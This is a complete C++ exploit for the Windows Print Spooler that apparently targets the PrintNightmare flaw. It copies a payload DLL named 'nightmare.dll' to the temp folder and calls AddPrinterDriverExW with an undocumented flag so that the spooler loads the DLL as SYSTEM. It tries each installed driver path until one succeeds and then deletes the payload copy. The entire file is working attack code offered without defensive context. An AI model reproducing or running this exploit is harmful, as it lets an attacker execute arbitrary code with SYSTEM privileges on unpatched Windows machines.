#include <iostream>
#include <Windows.h>
#include <rpc.h>    

// this flag option has been remove from latest microsoft document
#define APD_INSTALL_WARNED_DRIVER 0x8000

const CHAR* dll_name = "nightmare.dll";
const WCHAR* driver_name = L"My driver";
const WCHAR* enviroment = L"Windows x64";

//we must dynamically resolve the Winspool.drv library in order to exploit
typedef BOOL (WINAPI *funcPtrAddPrinterDriverEx)(LPTSTR, DWORD, LPBYTE, DWORD);

int main()
{
    DWORD cbCurDir; 
    cbCurDir = GetCurrentDirectoryA(0, NULL);
    CHAR* pszPathBuf = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbCurDir + strlen(dll_name) + 2);
    if (!GetCurrentDirectoryA(cbCurDir, pszPathBuf)) {
        printf("[-] Failed to get current working directory\n");
        return -1;
    }

    pszPathBuf[cbCurDir - 1] = '\\';
    strcat_s(pszPathBuf, cbCurDir + 1 + strlen(dll_name), dll_name);

    HANDLE hPayload;
    if ((hPayload = CreateFileA(pszPathBuf,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL)) == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open payload");
        return -1;
    }

    DWORD dwPayloadSize = GetFileSize(hPayload, NULL);
    printf("[+] Payload size: %ld bytes\n", dwPayloadSize);
    PBYTE pPayloadBuf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPayloadSize);
    if (!pPayloadBuf) {
        printf("[-] Failed to allocate payload buffer");
        return -1;
    }

    DWORD cbPayloadRead;
    if (!ReadFile(hPayload, pPayloadBuf, dwPayloadSize, &cbPayloadRead, NULL)) {
        printf("[-] Failed to read the payload\n");
        return -1;
    }
    //printf("[+] Payload read: %ld bytes\n", cbPayloadRead);
    CHAR szTempPath[1024];
    DWORD cbTempPathLen = GetTempPathA(MAX_PATH + 1, szTempPath);
    if (!cbTempPathLen) {
        printf("[-] Failed to get temp path");
        return -1;
    }
    
    szTempPath[cbTempPathLen - 1] = '\\';
    szTempPath[cbTempPathLen] = '\0';

    strcat_s(szTempPath, 1024, dll_name);

    HANDLE hTempPayload;
    if ((hTempPayload = CreateFileA(szTempPath,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL)) == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open payload");
        return -1;
    }

    DWORD dwPayloadWrite;
    if (!WriteFile(hTempPayload, pPayloadBuf, dwPayloadSize, &dwPayloadWrite, NULL)) {
        printf("[-] Failed to write payload");
        return -1;
    }
     
    HeapFree(GetProcessHeap(), 0, pPayloadBuf);
    CloseHandle(hTempPayload);
    CloseHandle(hPayload);

    size_t cbTempPath = strlen(szTempPath);
    WCHAR* pwszPayloadPath = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbTempPath * sizeof(WCHAR));
    MultiByteToWideChar(CP_UTF8, 0, szTempPath, -1, pwszPayloadPath, cbTempPath);
    wprintf(L"[+] Payload path: %s\n", pwszPayloadPath);

    WCHAR wszDriverName[25];
    wcscpy_s(wszDriverName, 25, driver_name);
    
    WCHAR wszEnviroment[25];
    wcscpy_s(wszEnviroment, 25, enviroment);

    //get the buffer size
    DWORD cbByteNeeded, cbReturn;
    if (!EnumPrinterDrivers(NULL, (WCHAR*)enviroment, 2, NULL, 0, &cbByteNeeded, &cbReturn)) {
        printf("[+] Allocate %ld byte for printer driver data\n", cbByteNeeded);
    }

    DWORD cbByte;
    PBYTE pDriverBuf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbByteNeeded);
    if (!EnumPrinterDrivers(NULL, (WCHAR*)enviroment, 2, pDriverBuf, cbByteNeeded, &cbByte, &cbReturn)) {
        printf("[-] Failed to get printer infomation\n");
        return -1;
    }

    HMODULE hPrinterLibrary = LoadLibraryA("winspool.drv");
    if (!hPrinterLibrary) {
        printf("[-] Failed to load printer library\n");
        return -1;
    }
    
    funcPtrAddPrinterDriverEx MyAddPrinterDriverEx = (funcPtrAddPrinterDriverEx)GetProcAddress(hPrinterLibrary, "AddPrinterDriverExW");
    
    if (!MyAddPrinterDriverEx) {
        printf("[-] Failed to get address of AddPrinterDriverEx\n");
        return -1;
    }

    printf("[+] function AddPrinterDriverEx found at 0x%p\n", (PVOID)MyAddPrinterDriverEx);

    DWORD i;
    DRIVER_INFO_2* drivers = (DRIVER_INFO_2* )pDriverBuf;

    PBYTE pMyDriverBuf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(DRIVER_INFO_2));
    // some driver path will not work so we have to iterate through the enumerated drivers in order to find the suitable driver
    for (i = 0; i < cbReturn; i++) {
        wprintf(L"[+] Using driver path %s\n", drivers[i].pDriverPath);
        DRIVER_INFO_2* myDriver = (DRIVER_INFO_2*)pMyDriverBuf;
        
        myDriver->cVersion = 3;
        myDriver->pConfigFile = pwszPayloadPath;
        myDriver->pDataFile = pwszPayloadPath;
        myDriver->pDriverPath = drivers[i].pDriverPath;
        myDriver->pEnvironment = wszEnviroment;
        myDriver->pName = wszDriverName;

        DWORD ret = ((MyAddPrinterDriverEx)(NULL, 
            2, 
            pMyDriverBuf, 
            APD_COPY_ALL_FILES | APD_COPY_FROM_DIRECTORY | APD_INSTALL_WARNED_DRIVER));
        
        printf("[!] AddPrinterDriverEx return %ld\n", ret);

        if (ret == 0) {
            printf("[!] AddPrinterDriverEx error: %ld try new driver\n", GetLastError());
            continue;
        }
        else {
            break;
        }
    }
    HeapFree(GetProcessHeap(), 0, pMyDriverBuf);

    //DRIVER_INFO_2 driver = *(DRIVER_INFO_2*)pDriverBuf;
    //wprintf(L"[+] Using driver path %s\n", driver.pDriverPath);
    // 
    //WCHAR wszDriverName[25];
    //wcscpy_s(wszDriverName, 25, driver_name);
    //
    //WCHAR wszEnviroment[25];
    //wcscpy_s(wszEnviroment, 25, enviroment);
    //
    //PBYTE pMyDriverBuf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(DRIVER_INFO_2));
    //
    //DRIVER_INFO_2* myDriver = (DRIVER_INFO_2*)pMyDriverBuf;
    //
    //myDriver->cVersion = 3;
    //myDriver->pConfigFile = pwszPayloadPath;
    //myDriver->pDataFile = pwszPayloadPath;
    //myDriver->pDriverPath = driver.pDriverPath;
    //myDriver->pEnvironment = wszEnviroment;
    //myDriver->pName = wszDriverName;
    //
    //HMODULE hPrinterLibrary = LoadLibraryA("winspool.drv");
    //if (!hPrinterLibrary) {
    //    printf("[-] Failed to load printer library\n");
    //    return -1;
    //}
    //
    //funcPtrAddPrinterDriverEx MyAddPrinterDriverEx = (funcPtrAddPrinterDriverEx)GetProcAddress(hPrinterLibrary, "AddPrinterDriverExW");
    //
    //if (!MyAddPrinterDriverEx) {
    //    printf("[-] Failed to get address of AddPrinterDriverEx\n");
    //    return -1;
    //}
    //
    //printf("[+] function AddPrinterDriverEx found at 0x%p\n", (PVOID)MyAddPrinterDriverEx);
    //
    //#define APD_INSTALL_WARNED_DRIVER 0x8000
    //
    //if (!(MyAddPrinterDriverEx)(NULL, 2, pMyDriverBuf, APD_COPY_ALL_FILES | APD_COPY_FROM_DIRECTORY | APD_INSTALL_WARNED_DRIVER)) {
    //    printf("[-] Failed to add driver error: %ld\n", GetLastError());
    //    return -1;
    //}
    //
    if (!DeleteFileW(pwszPayloadPath)) {
        printf("[-] Failed to delete old payload");
    }
    //
    //FreeLibrary(hPrinterLibrary);
    HeapFree(GetProcessHeap(), 0, pwszPayloadPath);
    //HeapFree(GetProcessHeap(), 0, pMyDriverBuf);
    HeapFree(GetProcessHeap(), 0, pDriverBuf);
    HeapFree(GetProcessHeap(), 0, pszPathBuf);

    return 0;
}
